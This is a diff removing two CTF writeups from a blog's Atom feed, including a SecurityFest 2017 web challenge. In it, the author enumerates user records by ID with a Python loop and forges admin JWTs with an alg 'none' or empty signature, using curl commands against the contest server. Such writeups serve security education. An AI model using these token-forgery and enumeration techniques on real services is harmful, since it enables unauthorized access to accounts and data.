-&lt;p&gt;gunakan utility di linux &lt;code class=&quot;highlighter-rouge&quot;&gt;echo -n &quot;BASE32FLAG&quot; | base32 -d&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Flag: &lt;strong&gt;CTFS{1m_4_b4s3_m4st3r}&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;meta-sih-anak-nakal&quot;&gt;Meta sih anak nakal&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Meta suka banget ngumpetin data di gambar, bisa gak temuin flag yang dia sembunyikan ? 
-
-Meta sih anak nakal.zip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;poc-5&quot;&gt;POC&lt;/h2&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exiftool img.jpg&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Flag: &lt;strong&gt;CTFS{m4t4d4t4_1tu_p3nt1ng}&lt;/strong&gt;&lt;/p&gt;
-
-
-  
-  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/ctf/writeup-final-beefest-2017.1&quot;&gt;BeeFest CTF 2017: Writeups&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on August 21, 2017.&lt;/p&gt;</content>
-</entry>
-
-
-
-<entry>
-  <title type="html"><![CDATA[SecurityFest CTF 2017 : Underconstruction]]></title>
-  <link rel="alternate" type="text/html" href="http://localhost:4000/ctf/securityfest2017-underconstruction"/>
-  <id>http://localhost:4000/ctf/securityfest2017-underconstruction</id>
-  <published>2017-06-02T00:00:00+07:00</published>
-  <updated>2017-06-02T00:00:00-00:00</updated>
-  
-  <author>
-    <name>Abdillah Muhamad</name>
-    <uri>http://localhost:4000</uri>
-    <email>hasny1337@gmail.com</email>
-  </author>
-  
-  
-  <category scheme="http://localhost:4000/tags/#Web%20Exploitation" term="Web Exploitation" />
-  
-  
-  <content type="html">
-  
-    &lt;h2 id=&quot;problems&quot;&gt;Problems&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Under Construction! Please protect your head, wear a hardhat.
-Solves: 12
-Service: http://web.ctf.rocks:8080
-Author: Kits / weckzen
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;writeup&quot;&gt;Writeup&lt;/h2&gt;
-
-&lt;p&gt;at this web challenges we can read in the source code at root path&lt;/p&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- I don't know the status of the front end but the back end is coming along nicely. Try /login with {&quot;username&quot;: &quot;user&quot;, &quot;password&quot;:&quot;password&quot;} --&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;using this curl to login&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➔ curl -H &quot;Content-Type: application/json&quot; \
--X POST -d '{&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;password&quot;}' \
-http://web.ctf.rocks:8080/login
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and we get this response&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt; HTTP/1.1 200 
-&amp;lt; X-Content-Type-Options: nosniff
-&amp;lt; X-XSS-Protection: 1; mode=block
-&amp;lt; Cache-Control: no-cache, no-store, max-age=0, must-revalidate
-&amp;lt; Pragma: no-cache
-&amp;lt; Expires: 0
-&amp;lt; X-Frame-Options: DENY
-&amp;lt; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY
-&amp;lt; Content-Length: 51
-&amp;lt; Date: Fri, 02 Jun 2017 03:23:30 GMT
-&amp;lt; 
-* Connection #0 to host web.ctf.rocks left intact
-{&quot;userId&quot;:&quot;52&quot;,&quot;authorizedURLs&quot;:[&quot;/login&quot;,&quot;/apis&quot;]}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;information we get is UserID:52 and authorizedURLs: [‘/login’,’/apis’] , and we got authorization header 
-with JWT (Json Web Token).&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY&lt;/code&gt;
-jwt have 3 part &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;header&amp;gt;.&amp;lt;payload&amp;gt;.&amp;lt;signature&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Header : 
-➔ echo -n eyJhbGciOiJIUzI1NiJ9 | base64 -d
-{&quot;alg&quot;:&quot;HS256&quot;}% 
-
-Payload : 
-➔ echo -n eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0 | base64 -d
-{&quot;user&quot;:&quot;user&quot;,&quot;exp&quot;:1497237810}
-
-Signature :
-*Signature is constructed using this algorithm 
-
-HMACSHA256(
-  base64UrlEncode(header) + &quot;.&quot; +
-  base64UrlEncode(payload),
-secret
-)
-
-*Concatenating base64 header and payload with &quot;.&quot; and encrypt with some custom secret string
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;let’s trying what /apis endoint does with this curl.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➔ curl -H &quot;Content-Type: application/json&quot; \
--X GET \         
--H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY' http://web.ctf.rocks:8080/apis
-{&quot;timestamp&quot;:1496374182620,&quot;status&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;exception&quot;:&quot;org.springframework.web.bind.MissingServletRequestParameterException&quot;,&quot;message&quot;:&quot;Required Integer parameter 'userId' is not present&quot;,&quot;path&quot;:&quot;/apis&quot;}% 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;missing parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;userId&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➔ curl -H &quot;Content-Type: application/json&quot; \
--X GET \
--H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY' &quot;http://web.ctf.rocks:8080/apis?userId=52&quot; 
-{&quot;urls&quot;:[&quot;/login&quot;,&quot;/apis&quot;],&quot;id&quot;:52,&quot;user&quot;:&quot;user&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;using some python to enumurate other users urls.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://web.ctf.rocks:8080/apis&quot;&lt;/span&gt;
-
-
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'content-type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'cookie'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;JSESSIONID=4B17338B92DFAF214BAF7D40F29FC561&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'authorization'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzA5ODI2MH0.FwX2y37d7C1eQdiLgrsyCoWc-PbMb_O4KfKT3KtpQZw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'cache-control'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;no-cache&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'postman-token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;c8908859-4423-0bf5-1049-db1bc7ffcc27&quot;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;querystring&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;userId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;querystring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'urls'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;get this result&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;([u'/login', u'/apis', u'/supersecretflagresource'], 0, u'admin')
-([u'/login', u'/apis'], 1, u'Patrik')
-([u'/login', u'/apis'], 2, u'Joakim')
-([u'/login', u'/apis'], 3, u'Joakim')
-([u'/login', u'/apis'], 4, u'Joakim')
-([u'/login', u'/apis'], 5, u'Joakim')
-([u'/login', u'/apis'], 6, u'Joakim')
-([u'/login', u'/apis'], 7, u'Joakim')
-([u'/login', u'/apis'], 8, u'Joakim')
-([u'/login', u'/apis'], 9, u'Joakim')
-([u'/login', u'/apis'], 10, u'Joakim')
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;we got some interesting urls &lt;code class=&quot;highlighter-rouge&quot;&gt;/supersecretflagresource&lt;/code&gt;.
-but we can’t access it directly because they validating our Authorization header JWT is not Admin&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➔ curl -H &quot;Content-Type: application/json&quot; \
--X GET \
--H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzIzNzgxMH0.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq-2O1fp3vY' &quot;http://web.ctf.rocks:8080/supersecretflagresource&quot; 
-{&quot;timestamp&quot;:1496374542889,&quot;status&quot;:403,&quot;error&quot;:&quot;Forbidden&quot;,&quot;message&quot;:&quot;Access is denied&quot;,&quot;path&quot;:&quot;/supersecretflagresource&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I am not solving this while the competition but trying to documenting this is a good challenge.
-if we change the JWT payload part to &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;user&quot;:&quot;admin&quot;,&quot;exp&quot;:1497237810}&lt;/code&gt; this will trigger exception because
-the signature validation is error.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➔ curl -H &quot;Content-Type: application/json&quot; \
--X GET \
--H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcyMzc4MTB9.80uu7Wo32CCkDpTwZNjVsYCsJFRwO_5xAq' &quot;http://web.ctf.rocks:8080/supersecretflagresource&quot; 
-{&quot;timestamp&quot;:1496374872312,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;exception&quot;:&quot;io.jsonwebtoken.SignatureException&quot;,&quot;message&quot;:&quot;JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.&quot;,&quot;path&quot;:&quot;/supersecretflagresource&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;so after reading some writeup there are 2 ways to bypass this restriction :&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;change the header algorithm to none and empty signature the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;user&quot;:&quot;admin&quot;,&quot;exp&quot;:1497099449}&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;header&amp;gt;.&amp;lt;payload&amp;gt;.&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;using empty header and empty signature and change the payload to &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;user&quot;:&quot;admin&quot;,&quot;exp&quot;:1497099449}&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;.&amp;lt;payload&amp;gt;.&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;the first way&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➔ curl -H &quot;Content-Type: application/json&quot; \
--X GET \
--H 'Authorization: Bearer eyJhbGciOiJub25lIn0_.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcwOTk0NDl9.' &quot;http://web.ctf.rocks:8080/supersecretflagresource&quot;
-{&quot;message&quot;:&quot;You are close now&quot;,&quot;script&quot;:&quot;function getFlag() {   var text = $('.c-intro').innerText;   return 'SCTF{' + text.slice(35,38) + text.slice(0,10) + '}';}&quot;,&quot;url&quot;:&quot;https://kits.se?kokitotsos&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;second way&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➔ curl -H &quot;Content-Type: application/json&quot; \
--X GET \
--H 'Authorization: Bearer .eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcwOTk0NDl9.' &quot;http://web.ctf.rocks:8080/supersecretflagresource&quot;
-{&quot;message&quot;:&quot;You are close now&quot;,&quot;script&quot;:&quot;function getFlag() {   var text = $('.c-intro').innerText;   return 'SCTF{' + text.slice(35,38) + text.slice(0,10) + '}';}&quot;,&quot;url&quot;:&quot;https://kits.se?kokitotsos&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;i am prefer the second way from here &lt;code class=&quot;highlighter-rouge&quot;&gt;https://losfuzzys.github.io/writeup/2017/05/31/SCTF2017-underconstruction/&lt;/code&gt;
-and the author say will remove the confusing part at v1.0 &lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/jwtk/jjwt/issues/212&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;so to get the flag just open &lt;code class=&quot;highlighter-rouge&quot;&gt;https://kits.se?kokitotsos&lt;/code&gt; and fire up console run the javascript function&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getFlag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.c-intro'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SCTF{'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;*Nb : i am trying &amp;gt;12Hour cracking the password of signature to construct a valid signature but got nothing&lt;/p&gt;
-
-&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;SCTF{lolKOKITOTSOS}&lt;/code&gt;&lt;/p&gt;
-
-  
-  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/ctf/securityfest2017-underconstruction&quot;&gt;SecurityFest CTF 2017 : Underconstruction&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on June 02, 2017.&lt;/p&gt;</content>
 </entry>
 
 
